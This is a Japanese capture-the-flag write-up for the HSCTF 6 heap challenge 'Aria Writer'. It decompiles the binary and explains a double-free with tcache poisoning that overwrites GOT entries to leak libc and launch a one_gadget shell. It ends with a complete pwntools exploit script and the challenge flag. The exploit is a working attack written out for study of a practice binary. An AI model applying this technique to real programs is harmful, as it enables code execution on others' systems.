---
tags: pwn
---

# HSCTF 6 - Aria Writer

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/hsncsclub/HSCTF-6-Problems>

## Writeup

### outline

libc-2.27なので例によってtcache poisoning。
問題はshow機能が無いのでlibc leakの為にGOT Overwriteをして何らかの関数をputsにし、更に何らかの既に呼ばれたGOTを設定する必要がある。しかもこのGOT Overwriteが出来そうなのがfreeしかないのでlibc leak後はfree出来ない。
よってlibc leak前に各サイズのtcacheの先頭を変更したいポインタにしておき最後に一気にcreate + editをすることでlibc leak + シェル起動のためのGOT Overwrite(one gadgetを仕込む)を行う。

### binary

```
$ checksec aria-writer
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
PIEが無いのでGOTやらPLTは簡単に使えそう。RELROもFullではないのでGOT Overwriteが狙える。

main関数のデコンパイルはこちら

```clike
void main(void)

{
  int __n;
  size_t sVar1;
  int local_18;
  
  local_18 = 0;
  setvbuf(stdout,(char *)0x0,2,0);
  printf("whats your name > ");
  fgets(name,200,stdin);
  sVar1 = strlen(name);
  if (name[(long)((int)sVar1 + -1)] == '\n') {
    name[(long)((int)sVar1 + -1)] = 0;
  }
  printf("hi %s!\n");
  while( true ) {
    while( true ) {
      while( true ) {
        prompt();
        __n = get_int();
        if (__n != 2) break;
        if (7 < local_18) {
          puts("why r u so indecisive...");
                    /* WARNING: Subroutine does not return */
          exit(0);
        }
        local_18 = local_18 + 1;
        puts("ok that letter was bad anyways...");
        free(global);
      }
      if (__n != 3) break;
      printf("secret name o: :");
      write(1,name,200);
      putchar(10);
    }
    if (__n != 1) {
      puts("That\'s not a choice! :(");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    puts("how long should it be? ");
    __n = get_int();
    if (__n < 1) {
      puts("omggg haxor!1!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (0x1a4 < __n) break;
    global = (char *)malloc((long)__n);
    printf("what should i write tho > ");
    fgets(global,__n,stdin);
  }
  puts("i can\'t write that much :/");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

選択肢入力で使われている`get_int`のデコンパイルはこちら↓

```clike
ulong get_int(void)

{
  uint uVar1;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Gimme int pls > ");
  read(0,local_58,4);
  uVar1 = atoi(local_58);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)uVar1;
}
```

最初に名前の入力を促すこと以外は普通のHeap問題っぽい、但しshow機能が見られない(何故か名前の開示は出来る)。

1. `write(size, data)`: 手紙のサイズを入力しそのサイズで確保した領域のポインタを`global`に代入する。その後、そのサイズまでの入力を確保した領域へ書き込む
2. `throw`: `global`を解放する、但し7回までしか出来ない
3. `show name`: 最初に入力した名前を表示する(これいる?)

それ以外の選択肢は用意されておらず、プログラムが終了する

`throw`は特にチェックが行われていないのでDouble Freeが出来る。

### libc leak

一番悩んだところ。なにせshow機能が無い。
最初`show name`を利用するのかと思ったがDouble Freeでは`*p = v`のような代入は出来ても`*p = *_p`のような代入は出来ない。したがってグローバル変数`name`の中身にどこかのGOTの中身を持ってくることは出来ない(たぶん)。
というわけでプログラム中から`func(p)`のようなものを探し出し、`func`を`puts`に、`p`をアドレス解決済のGOTにしてlibc leakを狙う。
ということでそういう箇所を探すと唯一`free(global)`がその候補になる。
問題はGOT Overwriteで`free`を書き換えてしまうと以後`free`が出来なくなる。実際に値が書き換わるのは`write`を呼んで確保と編集をする時なので次のようなtcacheを構成しておけば`free`が`puts`に置き換わってしまっても、各サイズの`write`を呼ぶだけで値を書き換えることが出来る。

```
~~ tcache (size: 0x20) ~~
free@GOT -> ???
~~ tcache (size: 0x30) ~~
global -> ???
~~ tcache (size: 0x40) ~~
p -> ???
...
```

具体的なtcacheの構成方法だが[SECCON Beginners CTF 2019 - Babyheap](/yYXGki35TMemC0Jxi9xUHA)で説明しているのと殆ど同じである。

1. `write(size1, data)`
```
global = a, *a = data, strlen(data) = size1
```

2. `throw()`
```
global = a, *a = null
~~ tcache (size: size1) ~~
a -> null
```

3. `throw()`
```
global = a, *a = a
~~ tcache (size: size1) ~~
a -> a -> ...
```

4. `write(size1, p)`
```
global = a, *a = p
~~ tcache (size: size1) ~~
a -> p -> ???
```

5. `write(size1, data)`
```
global = a, *a = data
~~ tcache (size: size1) ~~
p -> ???
```

ここで次の`write`を行ってしまうと実際に値が書き換わってしまうのでここで止めておく。そして別のサイズのtcacheでも同じ手順を取ればめでたく各サイズのtcacheの先頭に目当てのポインタが来ることになる。

このようなtcacheを構成してから`write(0x20, puts@plt)` -> `write(0x30, func@got)`とすると、以後`free`を呼ぶと`puts`になるため`throw`時に`puts(func@got)`が呼ばれてlibcの配置場所がわかる(ここでは適当に`setvbuf`を利用した)。

### One Gadget

libcがわかったので後は`system("/bin/sh")`かOne Gadgetを呼ぶだけである。今回はOne Gadgetを利用した。
先程のtcache構成の際に残しておいたサイズ0x40のtcacheを利用して`write(0x40, one_gadget)`とし、`exit@got`の中身をOne Gadgetに書き換える。そして後は適当に`exit`に辿り着くような入力をすれば良い、具体的には選択肢の入力で数字以外を入力した。
`system("/bin/sh")`を利用する場合は`get_int`内で入力を`atoi`に渡しているので`atoi@got`を`system`に書き換えてしまうのが良いと思われる(試してないです)(※追記: 直前の`read`が4バイトしか読まないので無理でした -> shだけでできた)

## Code

```python
from pwn import process, remote, p64, u64, ELF


def pad_u64(b):
    while len(b) < 8:
        b += b"\x00"

    return u64(b)

def _select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


# malloc & write
def mwrite(s, size, data=b"junk"):
    print("[+] mwrite")
    _select(s, b"1")
    s.recvuntil(b"> ")
    s.sendline(str(size).encode())
    s.recvuntil(b"> ")
    s.sendline(data)


def free(s):
    print("[+] free")
    _select(s, b"2")


# printf(show)
def show(s):
    print("[+] show")
    _select(s, b"3")
    s.recvuntil(b"secret name o: :")
    r = s.recvline().rstrip()
    return r


if __name__ == '__main__':
    target = "localhost"
    port = 2222
    binary = "./aria-writer"
    libc_file = "./libc-2.27.so"

    elf = ELF(binary)
    glo = elf.symbols["global"]
    puts_plt = elf.plt["puts"]
    free_got = elf.got["free"]
    setbuf_got = elf.got["setvbuf"]
    exit_got = elf.got["exit"]

    libc = ELF(libc_file)
    setbuf_libc = libc.symbols["setvbuf"]
    one_gadget = 0x4f322

    print(hex(glo))
    print(hex(puts_plt))

    s = remote(target, port)
    s.recvuntil(b"> ")
    s.sendline(b"/bin/sh")

    # top of tcache(0x20) = global
    size = 0x20
    mwrite(s, size)
    free(s)
    free(s)
    mwrite(s, size, p64(glo))
    mwrite(s, size)

    # top of tcache(0x30) = free@got
    size = 0x30
    mwrite(s, size)
    free(s)
    free(s)
    mwrite(s, size, p64(free_got))
    mwrite(s, size)

    # top of tcache(0x40) = exit@got
    size = 0x40
    mwrite(s, size)
    free(s)
    free(s)
    mwrite(s, size, p64(exit_got))
    mwrite(s, size)

    # *free@got = puts@plt
    mwrite(s, 0x30, p64(puts_plt))

    # *global = setbuf@got
    mwrite(s, 0x20, p64(setbuf_got))

    # libc leak
    free(s)
    s.recvline()
    libc_addr = pad_u64(s.recvline().rstrip()) - setbuf_libc
    print(hex(libc_addr))

    mwrite(s, 0x40, p64(libc_addr + one_gadget))
    _select(s, b"unko")

    s.interactive()
```

## Flag

`hsctf{1_should_tho}`

## 感想

サイズごとにtcacheのリストが分かれていることを利用すると複数の値を順にcreate+editしていくだけで一気に変更できるのが新鮮だった。
tcacheがサイズ毎に分かれている事を思い出せたのでそろそろtcache初級編は突破出来たかもしれない。

ところで`name`を利用する解法が思い付いた方は教えて下さい